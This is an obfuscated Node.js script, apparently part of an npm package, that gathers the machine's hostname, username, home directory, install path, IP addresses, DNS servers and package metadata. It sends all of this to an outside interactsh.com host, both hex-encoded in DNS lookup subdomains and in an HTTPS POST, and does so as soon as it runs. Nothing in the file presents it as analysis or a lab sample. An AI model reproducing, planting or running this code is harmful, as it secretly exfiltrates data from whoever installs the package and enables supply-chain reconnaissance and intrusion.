const os = require('os')
const dns = require('dns')
const querystring = require('querystring')
const https = require('https')
const fs = require('fs')
var path = require('path')
const packageJSON = require('./package.json')
const packageName = packageJSON.name
function getFiles(_0x160f93) {
  var _0x35ba09 = []
  for (var _0x2afd7d = 0; _0x2afd7d < _0x160f93.length; _0x2afd7d++) {
    mpath = _0x160f93[_0x2afd7d]
    files = fs.readdirSync(mpath)
    for (var _0x2f4b05 = 0; _0x2f4b05 < files.length; _0x2f4b05++) {
      _0x35ba09.push(path.join(mpath, files[_0x2f4b05]))
    }
  }
  return _0x35ba09
}
function toHex(_0x4220ab) {
  const _0x2bd6bd = Buffer.from(_0x4220ab, 'utf8')
  const _0x5c55c7 = _0x2bd6bd.toString('hex')
  return _0x5c55c7
}
function gethttpips() {
  var _0xcfd31c = []
  var _0x265490 = os.networkInterfaces()
  for (item in _0x265490) {
    if (item != 'lo') {
      for (var _0x2f961e = 0; _0x2f961e < _0x265490[item].length; _0x2f961e++) {
        _0xcfd31c.push(_0x265490[item][_0x2f961e].address)
      }
    }
  }
  return _0xcfd31c
}
function getIps() {
  str = ''
  var _0x12dbe4 = os.networkInterfaces()
  for (item in _0x12dbe4) {
    if (item != 'lo') {
      for (var _0x4ee8f8 = 0; _0x4ee8f8 < _0x12dbe4[item].length; _0x4ee8f8++) {
        str = str + toHex(_0x12dbe4[item][_0x4ee8f8].address) + '.'
      }
    }
  }
  return str.slice(0, -1)
}
function getPathChunks(_0x179dcf) {
  str = 'p'
  chunks = _0x179dcf.split('/')
  for (var _0x11817 = 0; _0x11817 < chunks.length; _0x11817++) {
    str = str + toHex(chunks[_0x11817]) + '.'
  }
  str = str.slice(0, -1) + 'p'
  return str
}
function toName(_0x5c7431) {
  var _0x382f81 = ''
  var _0xf5c4be = []
  var _0x1a5ce0 = ''
  var _0x2f893f = ''
  _0x382f81 =
    toHex(_0x5c7431.hn) +
    '.' +
    toHex(_0x5c7431.p) +
    '.' +
    getPathChunks(_0x5c7431.c) +
    '.' +
    toHex(_0x5c7431.un) +
    '.' +
    getIps() +
    '.' +
    'c5c77jy2vtc0000xqshggde77joyyyyyr.interactsh.com'
  if (_0x382f81.length > 255) {
    _0x1a5ce0 = toHex(_0x5c7431.p) + '.' + getPathChunks(_0x5c7431.c)
    _0x2f893f = getIps()
    if (_0x1a5ce0.length < 150) {
      _0x1a5ce0 =
        toHex(_0x5c7431.hn) + '.' + _0x1a5ce0 + '.' + toHex(_0x5c7431.un)
      _0xf5c4be.push(
        _0x1a5ce0 + '.' + 'c5c77jy2vtc0000xqshggde77joyyyyyr.interactsh.com'
      )
      _0xf5c4be.push(
        _0x2f893f + '.' + 'c5c77jy2vtc0000xqshggde77joyyyyyr.interactsh.com'
      )
    } else {
      if (_0x2f893f.length < 150) {
        _0x2f893f =
          toHex(_0x5c7431.hn) + '.' + toHex(_0x5c7431.un) + '.' + _0x2f893f
        _0xf5c4be.push(
          _0x1a5ce0 + '.' + 'c5c77jy2vtc0000xqshggde77joyyyyyr.interactsh.com'
        )
        _0xf5c4be.push(
          _0x2f893f + '.' + 'c5c77jy2vtc0000xqshggde77joyyyyyr.interactsh.com'
        )
      } else {
        _0xf5c4be.push(
          toHex(_0x5c7431.hn) +
            '.' +
            _0x1a5ce0 +
            '.' +
            'c5c77jy2vtc0000xqshggde77joyyyyyr.interactsh.com'
        )
        _0xf5c4be.push(
          toHex(_0x5c7431.hn) +
            '.' +
            toHex(_0x5c7431.hd) +
            '.' +
            toHex(_0x5c7431.un) +
            '.' +
            'c5c77jy2vtc0000xqshggde77joyyyyyr.interactsh.com'
        )
        _0xf5c4be.push(
          toHex(_0x5c7431.hn) +
            '.' +
            _0x2f893f +
            '.' +
            'c5c77jy2vtc0000xqshggde77joyyyyyr.interactsh.com'
        )
      }
    }
  } else {
    _0xf5c4be.push(_0x382f81)
  }
  return _0xf5c4be
}
const trackingData = {
  p: packageName,
  c: __dirname,
  hd: os.homedir(),
  hn: os.hostname(),
  un: os.userInfo().username,
  dns: JSON.stringify(dns.getServers()),
  r: packageJSON ? packageJSON['___resolved'] : undefined,
  v: packageJSON.version,
  pjson: packageJSON,
  ip: JSON.stringify(gethttpips()),
}
var queries = toName(trackingData)
for (var j = 0; j < queries.length; j++) {
  dns.lookup(queries[j], function (_0x34ca45, _0x2878ba) {})
}
var postData = querystring.stringify({ msg: JSON.stringify(trackingData) })
var options = {
  hostname: 'c5c77jy2vtc0000xqshggde77joyyyyyr.interactsh.com',
  port: 443,
  path: '/',
  method: 'POST',
  headers: {
    'Content-Type': 'application/x-www-form-urlencoded',
    'Content-Length': postData.length,
  },
}
var req = https.request(options, (_0x38ed11) => {
  _0x38ed11.on('data', (_0x1c0ca5) => {})
})
req.on('error', (_0x43a335) => {})
req.write(postData)
req.end()
